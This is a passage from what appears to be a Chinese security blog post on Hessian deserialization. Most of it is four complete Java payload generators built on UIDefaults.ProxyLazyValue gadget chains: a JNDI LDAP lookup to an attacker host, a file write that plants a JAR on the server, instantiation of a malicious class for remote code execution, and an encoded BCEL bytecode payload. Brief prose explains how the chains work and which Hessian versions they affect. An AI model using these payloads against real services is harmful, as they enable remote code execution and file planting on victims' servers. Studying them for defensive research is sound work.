<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ldap://ip:port/&quot;</span>&#125;;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;javax.naming.InitialContext&quot;</span>, <span class="string">&quot;doLookup&quot;</span>, ags);</span><br><span class="line">        Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        <span class="comment">//hessian序列</span></span><br><span class="line">        serObj(hashtable1, hashtable2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filewrite_JavaUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/kuaile/Desktop/工具/打点/leech/leech_for_linux.1.2.4.jar&quot;</span>));</span><br><span class="line">        Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/Users/kuaile/idea_code/tomcat/tmp.jar&quot;</span>,bytes&#125;;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, ags);</span><br><span class="line">        Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        <span class="comment">//hessian序列</span></span><br><span class="line">        serObj(hashtable1, hashtable2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="调用webapp下的类"><a href="#调用webapp下的类" class="headerlink" title="调用webapp下的类"></a>调用webapp下的类</h3><p>Hessian 4.x 3.x版本都可以触发</p>
<p>前面在漏洞原理中我们可以来看最后一步UIDefaults#ProxyLazyValue.createValue其中代码如下，获取到当前的类加载器，利用Class.forName来进行实例化，其中第二个参数为true的时候代表可以实例化静态代码块或者构造函数，那么当我们的newINstance的时候就会调用我们的指定的class的构造方法和函数</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904170813-kwgwvd1.png" alt="image"></p>
<p>于是我们在本地可以尝试手动写入一个恶意类test</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904171413-n9qzpzo.png" alt="image"></p>
<p>利用类加载去调用恶意类即可RCE</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">webapp_class_invoke</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;xkxdusu.dnsapi.cc&quot;</span>&#125;;</span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;com.example.tomcat.test&quot;</span>, <span class="literal">null</span>, ags);</span><br><span class="line">        Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">        hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">        <span class="comment">//hessian序列</span></span><br><span class="line">        serObj(hashtable1, hashtable2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">        Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">        hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessian2Output.writeObject(s);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        hessian2Output.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>Hessian 4.x</p>
<p>  在com.sun.org.apache.bcel.internal.util.JavaWrapper类中存在一个_main方法，实例化JavaWrapper的时候调用构造方法，在构造方法中又会调用getClassLoader方法获取到bcel classloader实例</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212214-05oycdz.png" alt="image"></p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904212259-moufpru.png" alt="image"></p>
<p>接着跟入runMain方法，利用bcel#loadClass方法将bcel字符串转换成对象，然后调用_main方法最后进行方法调用</p>
<p><img src="/2022/04/09/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230904213458-ib7l4pj.png" alt="image">需要本地jdk版本低于1.8.251</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Object[] ags = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5d$_$DA$U$3d$a3$dbn$ad$fahi$7dS$3ch$J$fb$e2AR$91H$c3$834$88$K$P$kd$3a$s5$cdvw3$3b$V$7e$96$X$c4$83$l$e0G$89$bbKT0$c9$dc$93$7b$ee$9ds$cf$cc$bc$bd$bf$bc$C$d8$c2$8a$83$MJ$O$s1$95$c5t$8c36fm$cc1dv$94$af$cc$$C$aaR$3dg$b0$ea$c1$b5d$Ym$u_$k$f5$ba$z$a9$cfx$cb$p$a6$d0$I$E$f7$ce$b9Vq$feEZ$e6FEq$ed$90$df$f2$L$cd$c3P$ea$ab$96$90$5e$8d$n$7d$d5$e5$cag$uU$$$h$j$w$bb$k$f7$dbn$d3h$e5$b7k$c9$u$ae$db$b7$M$e3$ff$94$Z$9c$fd$3b$nC$a3$C$3f$b21Oy3$e8i$n$PT$3c$b6$f8$7b$dcf$ac$90$83$8d$ac$8d$85$i$WQfX$PB$e9$977x$d9m$deGFv$dd$bd0$f4$94$e0$89$a6$5b$e7$9e$e8y$dc$Ez$93drX$c22$c3$d8o$5d$a2$fa$de$8e$5b$j$v$M$Z$eeS$df$s$Z$f2$7d$f6$b4$e7$h$d5$r$9fN$5b$9a$ef$a4X$a96$fe$f4$d0M$zy$t$F$c3j$e5$9fW$faA$9d$e8$40$c8$u$aa$91$d34$7df$bc$G$c0$e2$xS$i$a4$cc$rd$84$e9$b5$t$b0$87$a4$ecP$cc$q$q$c3$Q$c5$dcg$D$e10$e1$mF0J$5d$f1$e1$edD$Mp$9e1PH$3d$c2$ba$e8$x8$84$40$8a$fa$ac$l$w$O$c6$90$t$y$d0$b6$88$Z$a7$3d$91$9c$v$7e$A$f4$V$f5$iw$C$A$A&quot;</span>,<span class="string">&quot;s&quot;</span>&#125;&#125;;</span><br><span class="line">            UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, ags);</span><br><span class="line">            Reflections.setFieldValue(swingLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            Object[] keyValueList = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;abc&quot;</span>, swingLazyValue&#125;;</span><br><span class="line">            <span class="type">UIDefaults</span> <span class="variable">uiDefaults1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">            <span class="type">UIDefaults</span> <span class="variable">uiDefaults2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>(keyValueList);</span><br><span class="line">            Hashtable&lt;Object, Object&gt; hashtable1 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">            Hashtable&lt;Object, Object&gt; hashtable2 = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;Object, Object&gt;();</span><br><span class="line">            hashtable1.put(<span class="string">&quot;a&quot;</span>, uiDefaults1);</span><br><span class="line">            hashtable2.put(<span class="string">&quot;a&quot;</span>, uiDefaults2);</span><br><span class="line">            <span class="comment">//hessian序列</span></span><br><span class="line">            serObj(hashtable1, hashtable2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serObj</span><span class="params">(Object hashtable1, Object hashtable2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">4</span>);</span><br><span class="line">            Class&lt;?&gt; nodeC;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">            nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">4</span>);</span><br><span class="line">            Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable1, hashtable1, <span class="literal">null</span>));</span><br><span class="line">            Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, hashtable2, hashtable2, <span class="literal">null</span>));</span><br><span class="line">            Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">            <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;hessian.ser&quot;</span>));</span><br><span class="line">            hessian2Output.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">            hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            hessian2Output.writeObject(s);</span><br><span class="line">            hessian2Output.flush();</span><br><span class="line">            hessian2Output.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>3.x版本触发漏洞</p>
